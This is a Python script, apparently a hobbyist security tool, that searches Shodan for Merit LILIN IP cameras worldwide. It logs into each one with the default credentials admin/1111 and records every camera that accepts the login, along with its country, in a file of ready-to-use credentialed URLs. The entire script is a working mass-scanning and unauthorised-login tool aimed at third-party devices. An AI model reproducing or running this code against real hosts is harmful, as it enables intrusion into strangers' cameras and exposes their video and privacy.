#
# lilin.py
# Search SHODAN for Lilin IP Cameras
#
# Author: random_robbie and big thank you to @giuscri for spotting my error
import requests
import shodan
from requests.auth import HTTPBasicAuth
from requests.exceptions import ConnectionError
import re
import os
import sys


# Configuration
API_KEY = "YOUR API KEY"
SEARCH_FOR = 'WWW-Authenticate: Basic realm="Merit LILIN Ent. Co., Ltd."'


def test_cam (IP,PORT,CC):
	session = requests.Session()
	print ("[*] Trying "+IP+" Country: "+CC+"")
	if PORT == "443":
		URL = "https://"+IP+":"+PORT+"/lang1/index.html"
	else:
		URL = "http://"+IP+":"+PORT+"/lang1/index.html"
	headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
	try:
		response = session.get(URL, headers=headers, auth=HTTPBasicAuth("admin","1111"))
		if "Video Decoder" in response.text:
			text_file = open("found.txt", "a")
			text_file.write("http://admin:1111@"+IP+":"+PORT+"/lang1/index.html -Country: "+CC+"\n")
			text_file.close()
			print ("[*] Whoo Default Pass is being used and it has been logged. [*]")
		else:
			print ("[*] Not Using Default Pass. [*]")
			

	except Exception as e:

		print ("[*] Nothing Found on IP:"+IP+" [*]")

	

	



		


	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR, limit=100)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				CC = service['location']['country_name']
				PORT = str(service['port'])
				test_cam (IP,PORT,CC)
				

				
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
